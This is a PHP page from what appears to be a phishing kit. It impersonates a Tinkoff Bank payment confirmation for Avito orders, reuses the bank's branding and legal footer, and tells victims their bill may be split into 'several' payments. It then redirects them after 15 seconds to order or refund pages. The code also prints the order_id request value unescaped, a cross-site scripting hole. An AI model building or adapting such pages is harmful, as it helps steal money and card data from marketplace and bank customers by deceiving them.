<?php 

	if(empty($_REQUEST['order_id'])) {
		header("Location: https://$_SERVER[SERVER_NAME]/");
	} else {
		if($_COOKIE['type'] == 'order') {
			header("Refresh: 15; url=https://$_SERVER[SERVER_NAME]/order?id=$_REQUEST[order_id]");
		} elseif($_COOKIE['type'] == 'refund') {
			header("Refresh: 15; url=https://$_SERVER[SERVER_NAME]/refund?id=$_REQUEST[order_id]");
		} else {
			header("Refresh: 15; url=https://$_SERVER[SERVER_NAME]/");
		}
	}

?>

<!DOCTYPE html>
<html>
<head>
	<title>Тинькофф Банк - Оплата</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link rel="stylesheet" href="/assets/css/avito_common.css">
	<script type="text/javascript" src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
	<script type="text/javascript" src="/assets/js/tcsPayLib.js"></script>
	<script type="text/javascript" src="/assets/js/index.js"></script>
	<link href="/assets/img/favicon.jpg" rel="icon" type="image/x-icon">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"> </head>
<body id="body">
	<div class="wrapper" style="padding-left: 25%;padding-right: 25%;">
		<div class="wrapper__middle">
			<div class="header">
				<div class="header__logo"><img src="/assets/img/logo-avito.svg" alt="Avito"></div>
				<div class="header__fin-service">
					<div class="header__fin-service-image images__visa"></div>
					<div class="header__fin-service-image header__fin-service-image_diff images__master-card"></div>
					<div class="header__fin-service-image header__fin-service-image_last header__fin-service-mobile images__maestro"></div>
					<div class="header__fin-service-image header__fin-service-image_last images__mir"></div>
				</div>
			</div>
			<div class="mobile-border mobile-border_top">
				<div class="mobile-border__line"></div>
			</div>
			<div class="title"> Оплата заказа </div>
			<div style="padding: 5px 0px 15px;">
				<a class="title-info" href="#" target="_blank" style="background: #6dc5ff; padding: 5px; border-radius: 4px; color: #ffffff;">Заказ №<?php echo $_REQUEST['order_id']; ?></a>
			</div>
			<div class="">
				<p class="mb-0">Оплата вашего заказа <b>№<?php echo $_REQUEST['order_id']; ?></b> прошла успешно.<br><br>Для обеспечения безопасности, Ваш счёт к оплате может быть разбит на <b>несколько</b> платежей.</p>
			</div>
		</div>
	</div>
	<div class="footer" style="padding-right: 25%;padding-left: 25%;">
		<div class="form-card-supported-systems"><i class="grey-icon grey-icon-master-card"></i> <i class="grey-icon grey-icon-visa"></i> <i class="grey-icon grey-icon-mir"></i> <i class="grey-icon grey-icon-pci-dss"></i></div>
		<div class="form-card-add-info">Интернет-платежи защищены сертификатом SSL и протоколом 3D Secure. АО «Тинькофф Банк» не передает магазинам платежные данные, в том числе данные карты. Оплачивая заказ вы соглашаетесь с <a href="https://static2.tinkoff.ru/acquiring/agreement_avito2.pdf" target="_blank" rel="noopener noreferrer">офертой</a></div>
		<div class="form-card-add-info__logo">Сервис предоставлен «Тинькофф Банк»</div>
	</div>
</body>
</html>